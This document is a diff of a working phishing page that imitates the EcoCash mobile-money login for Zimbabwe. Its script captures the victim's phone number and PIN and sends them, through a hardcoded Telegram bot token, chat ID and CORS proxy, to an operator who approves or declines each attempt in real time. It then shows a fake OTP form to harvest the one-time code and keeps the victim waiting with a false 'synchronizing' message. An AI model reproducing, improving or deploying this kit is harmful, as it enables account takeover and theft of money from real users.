@@ -2,230 +2,559 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>EcoCash Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Login</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; position: relative; overflow-x: hidden; }
-        
-        /* Top Header */
-        .header { margin-top: 60px; text-align: center; }
-        .logo { font-size: 42px; font-weight: bold; letter-spacing: -1px; }
-        .logo .eco { color: #0000ff; }
+        /* Reset and Base Styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* =========================================
+           SHARED STYLES
+           ========================================= */
+        .logo {
+            font-size: 38px;
+            font-weight: 700;
+            margin-top: 40px;
+            margin-bottom: 30px;
+            letter-spacing: -1px;
+            text-align: center;
+        }
+        .logo .eco { color: #0033cc; }
         .logo .cash { color: #ff0000; }
-        .welcome-text { font-size: 36px; color: #333; margin-top: 30px; margin-bottom: 50px; font-weight: 400; }
 
-        /* Input Container */
-        .input-container { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; z-index: 10; }
-        
-        /* Phone Input */
-        .phone-box { width: 100%; display: flex; align-items: center; border: 1.5px solid #000; border-radius: 8px; padding: 15px; margin-bottom: 25px; background: white; }
-        .flag { margin-right: 10px; font-size: 20px; }
-        .country-code { font-size: 18px; color: #000; font-weight: 500; margin-right: 15px; }
-        .phone-input { border: none; outline: none; font-size: 18px; width: 100%; font-weight: 500; color: #333; }
-        .phone-input::placeholder { color: #333; font-weight: 500; }
+        .btn {
+            background-color: #6fa8dc;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 15px 0;
+            width: 80%;
+            max-width: 300px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: block;
+            margin: 0 auto;
+            text-align: center;
+            position: relative;
+        }
+        .btn:active { background-color: #558cb8; }
+        .btn:disabled { background-color: #a0c4e0; cursor: not-allowed; }
 
-        /* PIN Section */
-        .pin-label { font-size: 16px; color: #333; margin-bottom: 15px; }
-        .pin-boxes { display: flex; gap: 15px; margin-bottom: 15px; }
-        .pin-box { width: 55px; height: 60px; border: 2px solid #4a4a9c; border-radius: 12px; font-size: 24px; text-align: center; outline: none; color: #000; background: transparent; }
-        .pin-box:focus { border-color: #0000ff; }
-        .pin-box::-webkit-outer-spin-button, .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        .forgot-pin { color: #333; text-decoration: none; font-size: 15px; margin-bottom: 30px; }
+        .bottom-curve {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 35vh;
+            background-color: #0029d1;
+            border-top-left-radius: 50% 20%;
+            border-top-right-radius: 50% 20%;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: center;
+            padding-bottom: 40px;
+        }
 
-        /* Button & Status */
-        .login-btn { width: 250px; padding: 15px; background-color: #64a0cc; color: white; border: 2px solid #4a4a9c; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .login-btn:active { transform: scale(0.98); }
-        .login-btn:disabled { background-color: #a0c4e0; cursor: not-allowed; }
-        
-        .status-message { margin-top: 15px; font-size: 14px; font-weight: bold; height: 20px; text-align: center; }
-        .status-loading { color: #0000ff; }
-        .status-error { color: #ff0000; }
-        .status-success { color: #00aa00; }
+        .bottom-text {
+            color: white;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 1.5;
+            padding: 0 30px;
+            margin-bottom: 20px;
+            z-index: 3;
+        }
 
-        /* Bottom Blue */
-        .bottom-area { position: absolute; bottom: 0; width: 100%; height: 30vh; background-color: #0000ff; display: flex; flex-direction: column; justify-content: center; align-items: center; border-top-left-radius: 50% 20%; border-top-right-radius: 50% 20%; padding: 20px; z-index: 1; }
-        .bottom-text { color: white; text-align: center; font-size: 14px; line-height: 1.5; margin-bottom: 20px; max-width: 80%; }
-        .bottom-buttons { display: flex; gap: 10px; width: 100%; justify-content: center; }
-        .action-btn { background: white; color: #333; padding: 15px 20px; border-radius: 8px; border: none; font-size: 16px; font-weight: 500; width: 45%; cursor: pointer; }
+        /* =========================================
+           SCREEN 1: LOGIN PAGE STYLES
+           ========================================= */
+        #login-screen {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+            transition: opacity 0.3s ease;
+        }
+
+        h2.welcome {
+            font-size: 32px;
+            color: #333;
+            font-weight: 400;
+            margin-bottom: 40px;
+        }
+
+        .phone-input-container {
+            width: 90%;
+            max-width: 350px;
+            border: 2px solid #000;
+            border-radius: 12px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            background: white;
+        }
+
+        .flag-code {
+            font-size: 18px;
+            font-weight: 500;
+            color: #333;
+            border-right: 1px solid #ccc;
+            padding-right: 15px;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .phone-input-container input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            width: 100%;
+            color: #333;
+        }
+
+        .pin-label {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .pin-boxes {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .pin-input {
+            width: 55px;
+            height: 55px;
+            border: 2px solid #6a82fb;
+            border-radius: 12px;
+            font-size: 24px;
+            text-align: center;
+            outline: none;
+        }
+
+        .pin-input:focus {
+            border-color: #0033cc;
+            box-shadow: 0 0 5px rgba(0, 51, 204, 0.2);
+        }
+
+        .forgot-pin {
+            color: #333;
+            text-decoration: none;
+            font-size: 15px;
+            margin-bottom: 30px;
+        }
+
+        /* =========================================
+           SCREEN 2: WAITING & OTP STYLES
+           ========================================= */
+        #otp-screen {
+            width: 100%;
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        /* Loading Wait Screen */
+        #waiting-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            margin-top: 50px;
+            width: 90%;
+        }
+        .big-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #0033cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        h1.verify-title {
+            font-size: 28px;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.4;
+            padding: 0 20px;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .otp-input {
+            width: 60px;
+            height: 60px;
+            border: 2px solid #6a82fb;
+            border-radius: 12px;
+            font-size: 24px;
+            text-align: center;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .otp-input:focus {
+            border-color: #0033cc;
+        }
+
+        .resend-link {
+            color: #333;
+            text-decoration: none;
+            font-size: 15px;
+            margin-bottom: 40px;
+        }
+
+        /* Animations */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-        <div class="welcome-text">Welcome</div>
-    </div>
+    <!-- =========================================
+         SCREEN 1: LOGIN PAGE
+         ========================================= -->
+    <div id="login-screen">
+        <div class="logo">
+            <span class="eco">Eco</span><span class="cash">Cash</span>
+        </div>
 
-    <div class="input-container">
-        <div class="phone-box">
-            <span class="flag">🇿🇼</span>
-            <span class="country-code">+263</span>
-            <input type="tel" id="phone" class="phone-input" placeholder="Mobile number" autocomplete="off">
+        <h2 class="welcome">Welcome</h2>
+
+        <div class="phone-input-container">
+            <div class="flag-code">🇿🇼 +263</div>
+            <input type="tel" id="phoneNumber" placeholder="Mobile number" maxlength="10">
         </div>
 
         <div class="pin-label">Enter your PIN</div>
-        
         <div class="pin-boxes">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 0)">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 1)">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 2)">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 3)">
+            <input type="password" maxlength="1" class="pin-input" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-input" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-input" inputmode="numeric">
+            <input type="password" maxlength="1" class="pin-input" inputmode="numeric">
         </div>
 
         <a href="#" class="forgot-pin">Forgot PIN?</a>
 
-        <button class="login-btn" id="loginBtn" onclick="submitLogin()">Login</button>
-        <div id="statusMessage" class="status-message"></div>
+        <button class="btn" id="loginBtn" onclick="handleLogin()">
+            <span id="loginBtnText">Login</span>
+            <div class="spinner" id="loginSpinner"></div>
+        </button>
     </div>
 
-    <div class="bottom-area">
-        <div class="bottom-text">To register an EcoCash wallet or get assistance, click below</div>
-        <div class="bottom-buttons">
-            <button class="action-btn">Register</button>
-            <button class="action-btn">Help & Support</button>
+    <!-- =========================================
+         SCREEN 2: OTP VERIFICATION PAGE & WAITING PAGE
+         ========================================= -->
+    <div id="otp-screen">
+        <div class="logo">
+            <span class="eco">Eco</span><span class="cash">Cash</span>
+        </div>
+
+        <!-- Waiting Screen (While you click Approve in Telegram) -->
+        <div id="waiting-screen">
+            <div class="big-spinner"></div>
+            <h1 class="verify-title">Please Wait...</h1>
+            <p class="subtitle" style="margin-top: 10px;">Synchronizing with secure servers.<br>Do not close this page.</p>
+        </div>
+
+        <!-- Actual OTP Entry Form (Hidden until you Approve) -->
+        <div id="otp-form" style="display: none; width: 100%; flex-direction: column; align-items: center;">
+            <h1 class="verify-title">Verifying PIN</h1>
+            <p class="subtitle">Enter the 4-digit OTP sent to<br><strong id="displayPhone">+263 ...</strong></p>
+
+            <div class="otp-container">
+                <input type="number" maxlength="1" class="otp-input" autofocus>
+                <input type="number" maxlength="1" class="otp-input">
+                <input type="number" maxlength="1" class="otp-input">
+                <input type="number" maxlength="1" class="otp-input">
+            </div>
+
+            <a href="#" class="resend-link">Didn't receive code? Resend</a>
+
+            <button class="btn" onclick="alert('OTP Verified Successfully!')">
+                Verify & Proceed
+            </button>
         </div>
     </div>
 
+    <!-- Bottom Blue Section -->
+    <div class="bottom-curve">
+        <p class="bottom-text" id="bottomMessage">
+            To register an EcoCash wallet or get assistance, click below
+        </p>
+    </div>
+
+    <!-- =========================================
+         JAVASCRIPT LOGIC (API & POLLING)
+         ========================================= -->
     <script>
         // ==========================================
-        // 1. PUT YOUR TELEGRAM BOT DETAILS HERE
+        // ⚠️ SETUP YOUR TELEGRAM API DETAILS HERE ⚠️
         // ==========================================
-        const TELEGRAM_BOT_TOKEN = "8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY";
-        const TELEGRAM_CHAT_ID = "8094482230";
+        const TELEGRAM_BOT_TOKEN = '8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY'; // e.g., '7123456789:AAH...'
+        const TELEGRAM_CHAT_ID = '8094482230';     // e.g., '123456789'
         
-        let currentPhone = "";
-        let messageId = null; 
+        // CORS Proxy (Allows browser to read Telegram messages)
+        const PROXY_URL = 'https://corsproxy.io/?';
+        // ==========================================
+
         let pollingInterval = null;
+        let lastMessageId = 0;
 
-        function moveNext(current, index) {
-            if (current.value.length === 1) {
-                let next = document.getElementsByClassName('pin-box')[index + 1];
-                if (next) next.focus();
-            } else if (current.value.length === 0 && index > 0) {
-                let prev = document.getElementsByClassName('pin-box')[index - 1];
-                if (prev) prev.focus();
+        // --- 1. Auto-advance for PIN boxes ---
+        const pinInputs = document.querySelectorAll('.pin-input');
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // --- 2. Auto-advance for OTP boxes ---
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+            });
+        });
+
+        // --- 3. Handle Login Button Click ---
+        function handleLogin() {
+            const phoneInput = document.getElementById('phoneNumber').value;
+            let pinCode = '';
+            pinInputs.forEach(input => { pinCode += input.value; });
+
+            if (phoneInput.trim() === '' || pinCode.length < 4) {
+                alert('Please enter a valid phone number and 4-digit PIN.');
+                return;
             }
-        }
 
-        function setStatus(text, className) {
-            const statusDiv = document.getElementById('statusMessage');
-            statusDiv.innerText = text;
-            statusDiv.className = 'status-message ' + className;
-        }
-
-        async function submitLogin() {
-            currentPhone = document.getElementById('phone').value;
-            const pinBoxes = document.getElementsByClassName('pin-box');
-            let currentPin = "";
-            for (let i = 0; i < pinBoxes.length; i++) currentPin += pinBoxes[i].value;
-
-            if (currentPhone.length < 5) return setStatus("Enter valid mobile number.", "status-error");
-            if (currentPin.length !== 4) return setStatus("Enter 4-digit PIN.", "status-error");
-
+            // Show Loading State on Button
+            document.getElementById('loginBtnText').style.display = 'none';
+            document.getElementById('loginSpinner').style.display = 'block';
             document.getElementById('loginBtn').disabled = true;
-            document.getElementById('loginBtn').innerText = "Processing...";
-            setStatus("Sending to Telegram...", "status-loading");
 
-            // Format the message
-            const messageText = `🚨 *NEW LOGIN ATTEMPT* 🚨\n\n📱 Phone: \`${currentPhone}\`\n🔑 PIN: \`${currentPin}\`\n\nChoose an action:`;
-            
-            // Setup Telegram Buttons
-            const keyboard = {
-                inline_keyboard: [
-                    [
-                        { text: "✅ Correct PIN", callback_data: `correct_${currentPhone}` },
-                        { text: "❌ Wrong PIN", callback_data: `wrong_${currentPhone}` }
-                    ],
-                    [{ text: "🔄 Resend OTP", callback_data: `resend_${currentPhone}` }]
-                ]
+            // Prepare Telegram Message with Inline Buttons
+            const message = `🚨 *New EcoCash Login Attempt* 🚨\n\n📱 *Phone:* +263${phoneInput}\n🔐 *PIN:* ${pinCode}\n\n_Waiting for your approval..._`;
+
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Approve (Send OTP)", callback_data: "approve" },
+                            { text: "❌ Decline", callback_data: "decline" }
+                        ]
+                    ]
+                }
             };
 
-            try {
-                // Send Message to Telegram via API
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: messageText,
-                        parse_mode: 'Markdown',
-                        reply_markup: keyboard
-                    })
-                });
-
-                const data = await response.json();
-                
-                if (data.ok) {
-                    messageId = data.result.message_id; // Save ID to check for replies
-                    setStatus("Waiting for Admin Approval...", "status-loading");
-                    startPolling(); // Start looking for button clicks
+            // Send to Telegram
+            const url = `${PROXY_URL}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    // Save the ID of the message we just sent
+                    lastMessageId = data.result.message_id;
+                    
+                    // Move to the "Waiting" screen
+                    transitionToWaitingScreen(phoneInput);
+                    
+                    // Start checking Telegram for your click
+                    startPolling();
                 } else {
-                    setStatus("Bot Error. Check Token.", "status-error");
-                    resetLogin();
+                    alert("Error sending to Telegram. Check your Bot Token and Chat ID.");
+                    resetLoginButton();
                 }
-            } catch (error) {
-                setStatus("Network Error.", "status-error");
-                resetLogin();
-            }
+            })
+            .catch(error => {
+                console.error('Fetch Error:', error);
+                alert("Network error. Make sure the CORS proxy is working.");
+                resetLoginButton();
+            });
         }
 
-        // ==========================================
-        // 2. CHECK TELEGRAM FOR ADMIN CLICKS
-        // ==========================================
+        // --- 4. Transition UI to Waiting Screen ---
+        function transitionToWaitingScreen(phoneNumber) {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('otp-screen').style.display = 'flex';
+            
+            // Show spinner, hide form
+            document.getElementById('waiting-screen').style.display = 'flex';
+            document.getElementById('otp-form').style.display = 'none';
+            
+            document.getElementById('displayPhone').innerText = "+263 " + phoneNumber;
+            document.getElementById('bottomMessage').innerText = "Synchronizing with EcoCash servers...";
+
+            setTimeout(() => {
+                document.getElementById('otp-screen').style.opacity = '1';
+            }, 50);
+        }
+
+        // --- 5. Polling (Check Telegram every 3 seconds) ---
         function startPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
 
-            pollingInterval = setInterval(async () => {
-                try {
-                    // Get latest updates from Telegram
-                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
-                    const data = await res.json();
+            pollingInterval = setInterval(() => {
+                const updateUrl = `${PROXY_URL}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                
+                fetch(updateUrl)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        // Look through recent updates
+                        for (let update of data.result) {
+                            
+                            // If you clicked an inline button
+                            if (update.callback_query) {
+                                const callbackQuery = update.callback_query;
+                                const msgId = callbackQuery.message.message_id;
+                                const action = callbackQuery.data;
 
-                    if (!data.ok || !data.result) return;
-
-                    // Check if admin clicked a button for this specific message
-                    for (let update of data.result) {
-                        if (update.callback_query && update.callback_query.message.message_id === messageId) {
-                            const callbackData = update.callback_query.data;
-                            const action = callbackData.split('_')[0];
-
-                            // Acknowledge the click so the loading spinner stops in Telegram
-                            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);
-
-                            clearInterval(pollingInterval); // Stop checking
-
-                            if (action === "correct") {
-                                setStatus("✅ PIN Correct! Redirecting...", "status-success");
-                                setTimeout(() => {
-                                    window.location.href = "dashboard.html"; // <--- CHANGE THIS TO YOUR NEXT PAGE
-                                }, 1000);
-                            } 
-                            else if (action === "wrong") {
-                                setStatus("❌ Incorrect PIN. Try again.", "status-error");
-                                resetLogin();
-                            } 
-                            else if (action === "resend") {
-                                setStatus("🔄 OTP Resent to your phone.", "status-loading");
-                                // Telegram admin can click correct/wrong after this
-                                startPolling(); 
+                                // Check if the click belongs to our message
+                                if (msgId === lastMessageId) {
+                                    if (action === "approve") {
+                                        handleApproval(true, callbackQuery.id);
+                                        return;
+                                    } else if (action === "decline") {
+                                        handleApproval(false, callbackQuery.id);
+                                        return;
+                                    }
+                                }
                             }
-                            break;
                         }
                     }
-                } catch (e) {
-                    console.log("Waiting for updates...");
-                }
-            }, 2000); // Check every 2 seconds
+                })
+                .catch(err => console.log("Polling error (safe to ignore):", err));
+            }, 3000); // 3000ms = 3 seconds
         }
 
-        function resetLogin() {
+        // --- 6. Handle Approval/Decline from Telegram ---
+        function handleApproval(isApproved, callbackQueryId) {
+            clearInterval(pollingInterval); // Stop checking
+
+            // Answer the callback to remove loading state in Telegram
+            const answerUrl = `${PROXY_URL}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+            fetch(answerUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: callbackQueryId,
+                    text: isApproved ? "Approved!" : "Declined!"
+                })
+            });
+
+            // Update the Telegram message to show final status
+            const editUrl = `${PROXY_URL}https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+            fetch(editUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    message_id: lastMessageId,
+                    reply_markup: { inline_keyboard: [] } // Remove buttons
+                })
+            });
+
+            if (isApproved) {
+                // Show OTP Form
+                document.getElementById('waiting-screen').style.display = 'none';
+                const otpForm = document.getElementById('otp-form');
+                otpForm.style.display = 'flex';
+                
+                document.getElementById('bottomMessage').innerText = "For your security, never share your OTP with anyone.";
+                
+                setTimeout(() => {
+                    otpInputs[0].focus();
+                }, 100);
+            } else {
+                alert("Login declined by administrator.");
+                location.reload(); // Reload page
+            }
+        }
+
+        // Helper to reset button on error
+        function resetLoginButton() {
+            document.getElementById('loginBtnText').style.display = 'block';
+            document.getElementById('loginSpinner').style.display = 'none';
             document.getElementById('loginBtn').disabled = false;
-            document.getElementById('loginBtn').innerText = "Login";
-            const pinBoxes = document.getElementsByClassName('pin-box');
-            for (let i = 0; i < pinBoxes.length; i++) pinBoxes[i].value = "";
-            pinBoxes[0].focus();
         }
     </script>
+
 </body>
 </html>
